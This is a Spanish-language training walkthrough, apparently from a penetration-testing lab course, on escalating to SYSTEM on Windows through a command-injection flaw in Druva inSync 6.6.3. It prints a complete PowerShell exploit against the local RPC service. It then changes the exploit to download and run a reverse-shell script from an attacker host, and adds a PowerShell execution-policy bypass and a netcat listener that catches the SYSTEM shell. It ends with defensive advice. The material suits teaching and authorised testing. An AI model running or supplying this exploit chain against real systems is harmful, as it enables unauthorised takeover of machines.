Podríamos ser capaces de escalar privilegios en sistemas bien parcheados y bien configurados si se permite a los usuarios instalar software o si se utilizan aplicaciones/servicios de terceros vulnerables en toda la organización. Es común encontrar una multitud de diferentes aplicaciones y servicios en las workstations (estaciones de trabajo) con Windows durante nuestras evaluaciones. Veamos un ejemplo de un servicio vulnerable que podríamos encontrar en un entorno real. Algunos servicios/aplicaciones pueden permitirnos escalar a SYSTEM. En contraste, otros podrían causar una condición de denial-of-service (denegación de servicio) o permitir el acceso a datos sensibles como archivos de configuración que contienen contraseñas.

---

### Enumerating Installed Programs

Como se mencionó anteriormente, comencemos enumerando las aplicaciones instaladas para tener una idea del entorno.

```r
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

El resultado parece ser mayormente estándar para una workstation con Windows 10. Sin embargo, la aplicación `Druva inSync` se destaca. Una búsqueda rápida en Google muestra que la versión `6.6.3` es vulnerable a un ataque de command injection (inyección de comandos) a través de un servicio RPC expuesto. Podemos usar [este](https://www.exploit-db.com/exploits/49211) exploit PoC para escalar nuestros privilegios. Desde este [blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) que detalla el descubrimiento inicial de la falla, podemos ver que Druva inSync es una aplicación utilizada para “Integrated backup, eDiscovery, and compliance monitoring,” y la aplicación cliente ejecuta un servicio en el contexto de la poderosa cuenta `NT AUTHORITY\SYSTEM`. La escalación es posible al interactuar con un servicio que se ejecuta localmente en el puerto 6064.

### Enumerating Local Ports

Hagamos una mayor enumeración para confirmar que el servicio se está ejecutando como se espera. Una mirada rápida con `netstat` muestra un servicio ejecutándose localmente en el puerto `6064`.

```r
C:\htb> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

### Enumerating Process ID

A continuación, mapeemos el process ID (PID) `3324` al proceso en ejecución.

```r
PS C:\htb> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

### Enumerating Running Service

En este punto, tenemos suficiente información para determinar que la aplicación Druva inSync está instalada y en ejecución, pero podemos hacer una última verificación usando el cmdlet `Get-Service`.

```r
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

---

## Druva inSync Windows Client Local Privilege Escalation Example

### Druva inSync PowerShell PoC

Con esta información en mano, probemos el exploit PoC, que es este fragmento corto de PowerShell.

```r
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### Modifying PowerShell PoC

Para nuestros propósitos, queremos modificar la variable `$cmd` a nuestro comando deseado. Podemos hacer muchas cosas aquí, como agregar un usuario local admin (que es un poco ruidoso, y queremos evitar modificar cosas en los sistemas cliente siempre que sea posible) o enviarnos una reverse shell. Probemos esto con [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Descarga el script a nuestra máquina de ataque y renómbralo a algo simple como `shell.ps1`. Abre el archivo y agrega lo siguiente al final del archivo del script (cambiando la IP para que coincida con nuestra dirección y el puerto de escucha también):

```r
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Modifica la variable `$cmd` en el script del exploit PoC de Druva inSync para descargar nuestra reverse shell de PowerShell en memoria.

```r
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

### Starting a Python Web Server

A continuación, inicia un servidor web en Python en el mismo directorio donde reside nuestro script `script.ps1`.

```r
python3 -m http.server 8080
```

### Catching a SYSTEM Shell

Finalmente, inicia un listener de `Netcat` en la máquina de ataque y ejecuta el script PoC de PowerShell en el host objetivo (después de [modificar la política de ejecución de PowerShell](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) con un comando como `Set-ExecutionPolicy Bypass -Scope Process`). Obtendremos una conexión de reverse shell con privilegios de `SYSTEM` si todo sale según lo planeado.

```r
nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.


PS C:\WINDOWS\system32>whoami

nt authority\system


PS C:\WINDOWS\system32> hostname

WINLPE-WS01
```

---

## Moving On

Este ejemplo muestra cuán arriesgado puede ser permitir a los usuarios instalar software en sus máquinas y cómo siempre debemos enumerar el software instalado si llegamos a un servidor o host de escritorio con Windows. Las organizaciones deberían restringir los derechos de administrador local en las máquinas de los usuarios finales siguiendo el principio de privilegio mínimo. Además, una herramienta de whitelisting de aplicaciones puede ayudar a asegurar que solo el software debidamente evaluado sea instalado en las workstations de los usuarios.